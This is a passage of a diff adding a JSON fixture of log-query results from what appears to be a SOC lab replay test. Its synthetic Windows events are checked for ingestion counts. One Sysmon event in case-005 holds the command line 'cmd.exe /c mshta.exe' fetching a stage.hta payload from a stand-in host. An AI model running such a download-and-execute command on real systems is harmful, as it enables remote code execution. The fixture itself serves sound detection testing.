+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "seriesResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "labelResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "instantMetricResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              }
+            },
+            "index": {
+              "totalChunks": 0,
+              "postFilterChunks": 0,
+              "shardsDuration": 0,
+              "usedBloomFilters": false,
+              "totalStreams": 0,
+              "chunkRefsLookupTime": 0,
+              "bloomFilterTime": 0
+            }
+          }
+        }
+      },
+      "expected_records": 4,
+      "observed_records": 4
+    },
+    {
+      "case_id": "case-005",
+      "kind": "Synthetic multi-source experiment",
+      "replay": {
+        "labels": {
+          "job": "soclab",
+          "case_id": "case-005",
+          "replay_run": "ci-backend",
+          "kind": "synthetic",
+          "mode": "historical"
+        },
+        "sent_records": 2511,
+        "start_ns": 1788426000000000000,
+        "end_ns": 1788429610000000000,
+        "delivery": "at-least-once HTTP batches; no exactly-once claim"
+      },
+      "count_query": "sum(count_over_time({job=\"soclab\",case_id=\"case-005\",replay_run=\"ci-backend\",mode=\"historical\"}[3612s]))",
+      "count_response": {
+        "status": "success",
+        "data": {
+          "resultType": "vector",
+          "result": [
+            {
+              "metric": {},
+              "value": [
+                1788429610,
+                "2511"
+              ]
+            }
+          ],
+          "stats": {
+            "summary": {
+              "bytesProcessedPerSecond": 299140146,
+              "linesProcessedPerSecond": 428955,
+              "totalBytesProcessed": 1848028,
+              "totalLinesProcessed": 2650,
+              "execTime": 0.0061778,
+              "queueTime": 0.001143,
+              "subqueries": 0,
+              "totalEntriesReturned": 1,
+              "splits": 2,
+              "shards": 2,
+              "totalPostFilterLines": 2650,
+              "totalStructuredMetadataBytesProcessed": 26500
+            },
+            "querier": {
+              "store": {
+                "totalChunksRef": 2,
+                "totalChunksDownloaded": 2,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 1848028,
+                  "decompressedLines": 2650,
+                  "compressedBytes": 138399,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 2650,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 26500
+                },
+                "chunkRefsFetchTime": 2458400,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              },
+              "querierExecTime": 0.0111782
+            },
+            "ingester": {
+              "totalReached": 2,
+              "totalChunksMatched": 0,
+              "totalBatches": 2,
+              "totalLinesSent": 0,
+              "store": {
+                "totalChunksRef": 0,
+                "totalChunksDownloaded": 0,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 0,
+                  "decompressedLines": 0,
+                  "compressedBytes": 0,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 0,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 0
+                },
+                "chunkRefsFetchTime": 0,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              }
+            },
+            "cache": {
+              "chunk": {
+                "entriesFound": 2,
+                "entriesRequested": 2,
+                "entriesStored": 0,
+                "bytesReceived": 260138,
+                "bytesSent": 0,
+                "requests": 4,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "index": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "result": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "statsResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "volumeResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "seriesResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "labelResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "instantMetricResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              }
+            },
+            "index": {
+              "totalChunks": 0,
+              "postFilterChunks": 0,
+              "shardsDuration": 0,
+              "usedBloomFilters": false,
+              "totalStreams": 0,
+              "chunkRefsLookupTime": 0,
+              "bloomFilterTime": 0
+            }
+          }
+        }
+      },
+      "uid_query": "{job=\"soclab\",case_id=\"case-005\",replay_run=\"ci-backend\",mode=\"historical\"} | json | event_uid = \"bc8ba65d53680a499a7c1888f19ee64d01ac8105bcaff433b3c16a8ea9674ff6\"",
+      "uid_response": {
+        "status": "success",
+        "data": {
+          "resultType": "streams",
+          "result": [
+            {
+              "stream": {
+                "case_id": "case-005",
+                "channel": "Microsoft-Windows-Sysmon/Operational",
+                "command_line": "cmd.exe /c mshta.exe https://payload.example.invalid/stage.hta",
+                "destination_ip": "",
+                "event_data_CommandLine": "cmd.exe /c mshta.exe https://payload.example.invalid/stage.hta",
+                "event_data_Image": "C:\\Windows\\System32\\cmd.exe",
+                "event_data_LogonGuid": "{9e175872-74a3-5c6d-882c-524c742cb7dc}",
+                "event_data_LogonId": "0x42",
+                "event_data_ParentProcessGuid": "{00000000-0000-0000-0000-000000000000}",
+                "event_data_ProcessGuid": "{ac333bb9-aa2e-5082-938a-2c0dee8262a1}",
+                "event_data_ProcessId": "4000",
+                "event_data_User": "LAB\\analyst.lab",
+                "event_id": "1",
+                "event_uid": "bc8ba65d53680a499a7c1888f19ee64d01ac8105bcaff433b3c16a8ea9674ff6",
+                "host": "WS-CHAIN-LAB",
+                "image": "C:\\Windows\\System32\\cmd.exe",
+                "ip": "",
+                "job": "soclab",
+                "kind": "synthetic",
+                "logon_type": "",
+                "mode": "historical",
+                "original_timestamp": "2026-09-03T10:00:06.000000Z",
+                "parent_guid": "{00000000-0000-0000-0000-000000000000}",
+                "process_guid": "{ac333bb9-aa2e-5082-938a-2c0dee8262a1}",
+                "provider": "Microsoft-Windows-Sysmon",
+                "record_id": "106",
+                "replay_mode": "historical",
+                "replay_run": "ci-backend",
+                "script_block": "",
+                "service_name": "soclab",
+                "source_line": "1",
+                "source_sha256": "8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d",
+                "target_user": "",
+                "user": "LAB\\analyst.lab"
+              },
+              "values": [
+                [
+                  "1788429606000000000",
+                  "{\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"command_line\":\"cmd.exe /c mshta.exe https://payload.example.invalid/stage.hta\",\"destination_ip\":\"\",\"event_data\":{\"CommandLine\":\"cmd.exe /c mshta.exe https://payload.example.invalid/stage.hta\",\"Image\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"LogonGuid\":\"{9e175872-74a3-5c6d-882c-524c742cb7dc}\",\"LogonId\":\"0x42\",\"ParentProcessGuid\":\"{00000000-0000-0000-0000-000000000000}\",\"ProcessGuid\":\"{ac333bb9-aa2e-5082-938a-2c0dee8262a1}\",\"ProcessId\":\"4000\",\"User\":\"LAB\\\\analyst.lab\"},\"event_id\":1,\"event_uid\":\"bc8ba65d53680a499a7c1888f19ee64d01ac8105bcaff433b3c16a8ea9674ff6\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"ip\":\"\",\"logon_type\":\"\",\"original_timestamp\":\"2026-09-03T10:00:06.000000Z\",\"parent_guid\":\"{00000000-0000-0000-0000-000000000000}\",\"process_guid\":\"{ac333bb9-aa2e-5082-938a-2c0dee8262a1}\",\"provider\":\"Microsoft-Windows-Sysmon\",\"record_id\":106,\"replay_mode\":\"historical\",\"script_block\":\"\",\"source_line\":1,\"source_sha256\":\"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d\",\"target_user\":\"\",\"user\":\"LAB\\\\analyst.lab\"}"
+                ]
+              ]
+            }
+          ],
+          "stats": {
+            "summary": {
+              "bytesProcessedPerSecond": 185591592,
+              "linesProcessedPerSecond": 266145,
+              "totalBytesProcessed": 1751001,
+              "totalLinesProcessed": 2511,
+              "execTime": 0.009435,
+              "queueTime": 0.00079,
+              "subqueries": 0,
+              "totalEntriesReturned": 1,
+              "splits": 0,
+              "shards": 0,
+              "totalPostFilterLines": 1,
+              "totalStructuredMetadataBytesProcessed": 25110
+            },
+            "querier": {
+              "store": {
+                "totalChunksRef": 1,
+                "totalChunksDownloaded": 1,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 1751001,
+                  "decompressedLines": 2511,
+                  "compressedBytes": 129487,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 1,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 25110
+                },
+                "chunkRefsFetchTime": 1109700,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              },
+              "querierExecTime": 0.007939
+            },
+            "ingester": {
+              "totalReached": 1,
+              "totalChunksMatched": 0,
+              "totalBatches": 1,
+              "totalLinesSent": 0,
+              "store": {
+                "totalChunksRef": 0,
+                "totalChunksDownloaded": 0,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 0,
+                  "decompressedLines": 0,
+                  "compressedBytes": 0,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 0,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 0
+                },
+                "chunkRefsFetchTime": 0,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              },
+              "recvWaitTime": 0.000539
+            },
+            "cache": {
+              "chunk": {
+                "entriesFound": 1,
+                "entriesRequested": 1,
+                "entriesStored": 0,
+                "bytesReceived": 130069,
+                "bytesSent": 0,
+                "requests": 2,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "index": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "result": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "statsResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "volumeResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "seriesResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "labelResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "instantMetricResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              }
+            },
+            "index": {
+              "totalChunks": 0,
+              "postFilterChunks": 0,
+              "shardsDuration": 0,
+              "usedBloomFilters": false,
+              "totalStreams": 0,
+              "chunkRefsLookupTime": 0,
+              "bloomFilterTime": 0
+            }
+          }
+        }
+      },
+      "expected_records": 2511,
+      "observed_records": 2511
+    }
+  ],
+  "dashboard_replay": {
+    "labels": {
+      "job": "soclab",
+      "case_id": "case-005",
+      "replay_run": "ci-backend",
+      "kind": "synthetic",
+      "mode": "replay_now"
+    },
+    "sent_records": 11,
+    "start_ns": 1791296339064126700,
+    "end_ns": 1791296339064136700,
+    "delivery": "at-least-once HTTP batches; no exactly-once claim"
+  },
+  "dashboard_queries": [
+    {
+      "event_id": 4625,
+      "query": "{job=\"soclab\",case_id=\"case-005\",replay_run=\"ci-backend\",mode=\"replay_now\"} | json | event_id = 4625",
+      "expected": 5,
+      "observed": 5,
+      "response": {
+        "status": "success",
+        "data": {
+          "resultType": "streams",
+          "result": [
+            {
+              "stream": {
+                "case_id": "case-005",
+                "channel": "Security",
+                "command_line": "",
+                "destination_ip": "",
+                "event_data_IpAddress": "192.0.2.20",
+                "event_data_LogonType": "3",
+                "event_data_Status": "0xc000006d",
+                "event_data_SubStatus": "0xc000006a",
+                "event_data_TargetDomainName": "LAB",
+                "event_data_TargetUserName": "analyst.lab",
+                "event_id": "4625",
+                "event_uid": "34708f039f64e9944eb390107df937531d3e285273375912e02b0269da147a2a",
+                "host": "WS-CHAIN-LAB",
+                "image": "",
+                "ip": "192.0.2.20",
+                "job": "soclab",
+                "kind": "synthetic",
+                "logon_type": "3",
+                "mode": "replay_now",
+                "original_timestamp": "2026-09-03T10:00:01.000000Z",
+                "parent_guid": "",
+                "process_guid": "",
+                "provider": "Microsoft-Windows-Security-Auditing",
+                "record_id": "101",
+                "replay_mode": "replay_now",
+                "replay_run": "ci-backend",
+                "script_block": "",
+                "service_name": "soclab",
+                "source_line": "2",
+                "source_sha256": "c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53",
+                "target_user": "analyst.lab",
+                "user": ""
+              },
+              "values": [
+                [
+                  "1791296339064127700",
+                  "{\"channel\":\"Security\",\"command_line\":\"\",\"destination_ip\":\"\",\"event_data\":{\"IpAddress\":\"192.0.2.20\",\"LogonType\":\"3\",\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"TargetDomainName\":\"LAB\",\"TargetUserName\":\"analyst.lab\"},\"event_id\":4625,\"event_uid\":\"34708f039f64e9944eb390107df937531d3e285273375912e02b0269da147a2a\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"\",\"ip\":\"192.0.2.20\",\"logon_type\":\"3\",\"original_timestamp\":\"2026-09-03T10:00:01.000000Z\",\"parent_guid\":\"\",\"process_guid\":\"\",\"provider\":\"Microsoft-Windows-Security-Auditing\",\"record_id\":101,\"replay_mode\":\"replay_now\",\"script_block\":\"\",\"source_line\":2,\"source_sha256\":\"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53\",\"target_user\":\"analyst.lab\",\"user\":\"\"}"
+                ]
+              ]
+            },
+            {
+              "stream": {
+                "case_id": "case-005",
+                "channel": "Security",
+                "command_line": "",
+                "destination_ip": "",
+                "event_data_IpAddress": "192.0.2.20",
+                "event_data_LogonType": "3",
+                "event_data_Status": "0xc000006d",
+                "event_data_SubStatus": "0xc000006a",
+                "event_data_TargetDomainName": "LAB",
+                "event_data_TargetUserName": "analyst.lab",
+                "event_id": "4625",
+                "event_uid": "adcb4a75e805e21d7cf57b3bf5aa50b06f592d174ea00c74e091138ff2b6a1b4",
+                "host": "WS-CHAIN-LAB",
+                "image": "",
+                "ip": "192.0.2.20",
+                "job": "soclab",
+                "kind": "synthetic",
+                "logon_type": "3",
+                "mode": "replay_now",
+                "original_timestamp": "2026-09-03T10:00:03.000000Z",
+                "parent_guid": "",
+                "process_guid": "",
+                "provider": "Microsoft-Windows-Security-Auditing",
+                "record_id": "103",
+                "replay_mode": "replay_now",
+                "replay_run": "ci-backend",
+                "script_block": "",
+                "service_name": "soclab",
+                "source_line": "4",
+                "source_sha256": "c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53",
+                "target_user": "analyst.lab",
+                "user": ""
+              },
+              "values": [
+                [
+                  "1791296339064129700",
+                  "{\"channel\":\"Security\",\"command_line\":\"\",\"destination_ip\":\"\",\"event_data\":{\"IpAddress\":\"192.0.2.20\",\"LogonType\":\"3\",\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"TargetDomainName\":\"LAB\",\"TargetUserName\":\"analyst.lab\"},\"event_id\":4625,\"event_uid\":\"adcb4a75e805e21d7cf57b3bf5aa50b06f592d174ea00c74e091138ff2b6a1b4\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"\",\"ip\":\"192.0.2.20\",\"logon_type\":\"3\",\"original_timestamp\":\"2026-09-03T10:00:03.000000Z\",\"parent_guid\":\"\",\"process_guid\":\"\",\"provider\":\"Microsoft-Windows-Security-Auditing\",\"record_id\":103,\"replay_mode\":\"replay_now\",\"script_block\":\"\",\"source_line\":4,\"source_sha256\":\"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53\",\"target_user\":\"analyst.lab\",\"user\":\"\"}"
+                ]
+              ]
+            },
+            {
+              "stream": {
+                "case_id": "case-005",
+                "channel": "Security",
+                "command_line": "",
+                "destination_ip": "",
+                "event_data_IpAddress": "192.0.2.20",
+                "event_data_LogonType": "3",
+                "event_data_Status": "0xc000006d",
+                "event_data_SubStatus": "0xc000006a",
+                "event_data_TargetDomainName": "LAB",
+                "event_data_TargetUserName": "analyst.lab",
+                "event_id": "4625",
+                "event_uid": "d9ea1507c860ebcb6c49e86da3543f23477c6b9dced71e5585efee17c16ea3d7",
+                "host": "WS-CHAIN-LAB",
+                "image": "",
+                "ip": "192.0.2.20",
+                "job": "soclab",
+                "kind": "synthetic",
+                "logon_type": "3",
+                "mode": "replay_now",
+                "original_timestamp": "2026-09-03T10:00:04.000000Z",
+                "parent_guid": "",
+                "process_guid": "",
+                "provider": "Microsoft-Windows-Security-Auditing",
+                "record_id": "104",
+                "replay_mode": "replay_now",
+                "replay_run": "ci-backend",
+                "script_block": "",
+                "service_name": "soclab",
+                "source_line": "5",
+                "source_sha256": "c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53",
+                "target_user": "analyst.lab",
+                "user": ""
+              },
+              "values": [
+                [
+                  "1791296339064130700",
+                  "{\"channel\":\"Security\",\"command_line\":\"\",\"destination_ip\":\"\",\"event_data\":{\"IpAddress\":\"192.0.2.20\",\"LogonType\":\"3\",\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"TargetDomainName\":\"LAB\",\"TargetUserName\":\"analyst.lab\"},\"event_id\":4625,\"event_uid\":\"d9ea1507c860ebcb6c49e86da3543f23477c6b9dced71e5585efee17c16ea3d7\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"\",\"ip\":\"192.0.2.20\",\"logon_type\":\"3\",\"original_timestamp\":\"2026-09-03T10:00:04.000000Z\",\"parent_guid\":\"\",\"process_guid\":\"\",\"provider\":\"Microsoft-Windows-Security-Auditing\",\"record_id\":104,\"replay_mode\":\"replay_now\",\"script_block\":\"\",\"source_line\":5,\"source_sha256\":\"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53\",\"target_user\":\"analyst.lab\",\"user\":\"\"}"
+                ]
+              ]
+            },
+            {
+              "stream": {
+                "case_id": "case-005",
+                "channel": "Security",
+                "command_line": "",
+                "destination_ip": "",
+                "event_data_IpAddress": "192.0.2.20",
+                "event_data_LogonType": "3",
+                "event_data_Status": "0xc000006d",
+                "event_data_SubStatus": "0xc000006a",
+                "event_data_TargetDomainName": "LAB",
+                "event_data_TargetUserName": "analyst.lab",
+                "event_id": "4625",
+                "event_uid": "f4306533550f55d80cf9878e653b252eae2a2cc0dd71233f2fcebd92be932be3",
+                "host": "WS-CHAIN-LAB",
+                "image": "",
+                "ip": "192.0.2.20",
+                "job": "soclab",
+                "kind": "synthetic",
+                "logon_type": "3",
+                "mode": "replay_now",
+                "original_timestamp": "2026-09-03T10:00:00.000000Z",
+                "parent_guid": "",
+                "process_guid": "",
+                "provider": "Microsoft-Windows-Security-Auditing",
+                "record_id": "100",
+                "replay_mode": "replay_now",
+                "replay_run": "ci-backend",
+                "script_block": "",
+                "service_name": "soclab",
+                "source_line": "1",
+                "source_sha256": "c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53",
+                "target_user": "analyst.lab",
+                "user": ""
+              },
+              "values": [
+                [
+                  "1791296339064126700",
+                  "{\"channel\":\"Security\",\"command_line\":\"\",\"destination_ip\":\"\",\"event_data\":{\"IpAddress\":\"192.0.2.20\",\"LogonType\":\"3\",\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"TargetDomainName\":\"LAB\",\"TargetUserName\":\"analyst.lab\"},\"event_id\":4625,\"event_uid\":\"f4306533550f55d80cf9878e653b252eae2a2cc0dd71233f2fcebd92be932be3\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"\",\"ip\":\"192.0.2.20\",\"logon_type\":\"3\",\"original_timestamp\":\"2026-09-03T10:00:00.000000Z\",\"parent_guid\":\"\",\"process_guid\":\"\",\"provider\":\"Microsoft-Windows-Security-Auditing\",\"record_id\":100,\"replay_mode\":\"replay_now\",\"script_block\":\"\",\"source_line\":1,\"source_sha256\":\"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53\",\"target_user\":\"analyst.lab\",\"user\":\"\"}"
+                ]
+              ]
+            },
+            {
+              "stream": {
+                "case_id": "case-005",
+                "channel": "Security",
+                "command_line": "",
+                "destination_ip": "",
+                "event_data_IpAddress": "192.0.2.20",
+                "event_data_LogonType": "3",
+                "event_data_Status": "0xc000006d",
+                "event_data_SubStatus": "0xc000006a",
+                "event_data_TargetDomainName": "LAB",
+                "event_data_TargetUserName": "analyst.lab",
+                "event_id": "4625",
+                "event_uid": "f6885debff92028f9dd4d36fc2ed0cc080af499f6031bc01d5cf0cb7673d51ed",
+                "host": "WS-CHAIN-LAB",
+                "image": "",
+                "ip": "192.0.2.20",
+                "job": "soclab",
+                "kind": "synthetic",
+                "logon_type": "3",
+                "mode": "replay_now",
+                "original_timestamp": "2026-09-03T10:00:02.000000Z",
+                "parent_guid": "",
+                "process_guid": "",
+                "provider": "Microsoft-Windows-Security-Auditing",
+                "record_id": "102",
+                "replay_mode": "replay_now",
+                "replay_run": "ci-backend",
+                "script_block": "",
+                "service_name": "soclab",
+                "source_line": "3",
+                "source_sha256": "c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53",
+                "target_user": "analyst.lab",
+                "user": ""
+              },
+              "values": [
+                [
+                  "1791296339064128700",
+                  "{\"channel\":\"Security\",\"command_line\":\"\",\"destination_ip\":\"\",\"event_data\":{\"IpAddress\":\"192.0.2.20\",\"LogonType\":\"3\",\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"TargetDomainName\":\"LAB\",\"TargetUserName\":\"analyst.lab\"},\"event_id\":4625,\"event_uid\":\"f6885debff92028f9dd4d36fc2ed0cc080af499f6031bc01d5cf0cb7673d51ed\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"\",\"ip\":\"192.0.2.20\",\"logon_type\":\"3\",\"original_timestamp\":\"2026-09-03T10:00:02.000000Z\",\"parent_guid\":\"\",\"process_guid\":\"\",\"provider\":\"Microsoft-Windows-Security-Auditing\",\"record_id\":102,\"replay_mode\":\"replay_now\",\"script_block\":\"\",\"source_line\":3,\"source_sha256\":\"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53\",\"target_user\":\"analyst.lab\",\"user\":\"\"}"
+                ]
+              ]
+            }
+          ],
+          "stats": {
+            "summary": {
+              "bytesProcessedPerSecond": 3864065,
+              "linesProcessedPerSecond": 4423,
+              "totalBytesProcessed": 9608,
+              "totalLinesProcessed": 11,
+              "execTime": 0.002487,
+              "queueTime": 0,
+              "subqueries": 0,
+              "totalEntriesReturned": 5,
+              "splits": 0,
+              "shards": 0,
+              "totalPostFilterLines": 5,
+              "totalStructuredMetadataBytesProcessed": 110
+            },
+            "querier": {
+              "store": {
+                "totalChunksRef": 1,
+                "totalChunksDownloaded": 1,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 9608,
+                  "decompressedLines": 11,
+                  "compressedBytes": 1796,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 5,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 110
+                },
+                "chunkRefsFetchTime": 0,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              },
+              "querierExecTime": 0.000869
+            },
+            "ingester": {
+              "totalReached": 1,
+              "totalChunksMatched": 0,
+              "totalBatches": 1,
+              "totalLinesSent": 0,
+              "store": {
+                "totalChunksRef": 0,
+                "totalChunksDownloaded": 0,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 0,
+                  "decompressedLines": 0,
+                  "compressedBytes": 0,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 0,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 0
+                },
